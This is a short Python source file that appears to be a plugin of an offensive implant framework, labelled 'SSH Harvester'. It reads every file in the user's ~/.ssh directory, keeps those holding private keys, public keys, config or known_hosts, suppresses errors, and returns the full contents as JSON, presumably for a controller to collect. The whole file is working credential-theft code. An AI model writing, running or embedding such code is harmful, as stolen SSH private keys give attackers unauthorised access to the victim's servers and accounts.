import os
import json

def run(**args):
    print("[*] In SSH Harvester module.")
    ssh_dir = os.path.expanduser("~/.ssh")
    keys = []
    
    if os.path.exists(ssh_dir):
        for filename in os.listdir(ssh_dir):
            filepath = os.path.join(ssh_dir, filename)
            if os.path.isfile(filepath):
                try:
                    with open(filepath, "r") as f:
                        content = f.read()
                        # Only grab what looks like keys or config
                        if "PRIVATE KEY" in content or "ssh-" in content or filename == "config" or filename == "known_hosts":
                            keys.append({
                                "filename": filename,
                                "content": content
                            })
                except Exception: pass
                
    return json.dumps({"ssh_keys": keys, "count": len(keys)})
